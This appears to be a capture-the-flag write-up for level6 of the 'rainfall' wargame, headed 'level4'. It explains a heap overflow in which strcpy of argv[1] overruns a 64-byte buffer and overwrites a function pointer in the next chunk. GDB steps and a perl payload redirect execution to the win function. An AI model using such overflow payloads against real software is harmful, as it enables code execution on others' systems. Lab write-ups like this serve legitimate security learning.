# level4

Pull the executable:

```sh
sshpass -f ../level5/flag scp level6@rainfall:level6 .
```

See `source.c` for source reconstitution.

Now we're doing something else.  We have a function `m` that is the default execution path, and a function `n` that is the win path.  The program makes two dynamic allocations with `malloc(3)`: one big of 64 bytes, one small of 4 bytes.  It copies the address of the `m` function (lose path) into the small buffer and uses `strcpy(3)` to copy the contents of the first command-line argument (`argv[1]`) into the big buffer.  Finally, it makes a call to the address located inside the small buffer.

`strcpy` is notoriously dangerous because it does not perform bounds checking on its input string and stops only when reaching a NUL byte.  It's not as bad as `gets(3)`, but it must not be used when dealing with untrusted input (e.g. user input).

What we need to do is rather obvious: craft `argv[1]` so that it overflows the big buffer and writes into the small buffer the address of `n` (win path).

With GDB, we can inspect the address of the buffers:

```sh
gdb ./level6
# break after each malloc
b *main+21
b *main+37
r "hello world"
p/x $eax
# big = 0x804a008
c
p/x $eax
# small = 0x804a050
c
```

We now have our addresses.  They are 72 bytes apart, that means there are 8 bytes of metadata between each data chunk.  For this level metadata don't matter because the program never needs the malloc subsystem to manage memory further, so we can write over it with little to no issue.

```sh
{
    # big buffer data
    perl -e 'print "." x 64'
    
    # small buffer metadata
    perl -e 'print "~" x 8'
    
    # small buffer data
    perl -e 'print "B" x 4'
} > /tmp/6

# ................................................................~~~~~~~~BBBB
cat /tmp/6

gdb ./level6

# payload
r "................................................................~~~~~~~~BBBB"
```

We get:

```
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Great, so now we just replace `BBBB` with the address of `n` and we are done.

```sh
perl -e 'print "." x 64, "~" x 8, pack("L<", 0x8048454)' > /tmp/6
./level6 "$(cat /tmp/6)"
```

And we get the flag.
